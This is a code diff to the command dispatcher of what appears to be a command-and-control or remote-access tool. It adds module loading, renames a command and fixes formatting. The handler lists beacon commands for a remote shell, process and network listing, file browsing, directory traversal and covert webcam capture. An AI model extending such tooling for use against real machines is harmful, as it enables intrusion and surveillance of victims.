@@ -107,7 +107,7 @@ class InteractionHandler:
             "listdir": lambda: beaconClass.list_dir(UserID, IPAddress),
             "close": lambda: beaconClass.close_connection(UserID),
             "processes": lambda: beaconClass.list_processes(UserID),
-            "sysinfo": lambda: beaconClass.systeminfo(UserID),
+            "system_info": lambda: beaconClass.systeminfo(UserID),
             "diskusage": lambda: beaconClass.disk_usage(UserID),
             "netstat": lambda: beaconClass.netstat(UserID),
             "session": handle_session,
@@ -115,7 +115,8 @@ class InteractionHandler:
             "directorytraversal": lambda: beaconClass.dir_traversal(UserID),
             "takephoto": lambda: beaconClass.takePhoto(UserID),
             "listfiles": lambda: beaconClass.list_files(UserID),
-            "viewfile": lambda: beaconClass.view_file(UserID) # Assuming a typo fix from list_files
+            "viewfile": lambda: beaconClass.view_file(UserID),
+            "module": lambda: beaconClass.load_module(UserID),
         }
 
         while True:
@@ -132,7 +133,20 @@ class InteractionHandler:
                 break
 
             handler = command_handlers.get(command)
+            default_commands = ["commands", "shell", "close", "module"]
             if handler:
+                # Only check for module loading for non-default commands
+                if command not in default_commands and command not in getattr(beaconClass, "loaded_modules", []):
+                    logger.warning("Module not loaded, cannot execute command.")
+                    print(colorama.Fore.RED + "Module not loaded, cannot execute command.")
+                    load = input(
+                        colorama.Fore.YELLOW + "Load module? (y/N): ").lower().strip()
+                    if load == "y":
+                        logger.info(f"Loading module for command: {command}")
+                        beaconClass.load_module_directly(UserID, command)
+                    else:
+                        logger.info("Module not loaded, command skipped.")
+                        continue
                 try:
                     logger.info(f"Executing/queueing command: {command}")
                     handler()
@@ -146,5 +160,5 @@ class InteractionHandler:
                         print(colorama.Fore.RED + "Traceback:")
                         traceback.print_exc()
             else:
-                 print(colorama.Fore.RED + f"Unknown command: '{command}'")
+                print(colorama.Fore.RED + f"Unknown command: '{command}'")
         return
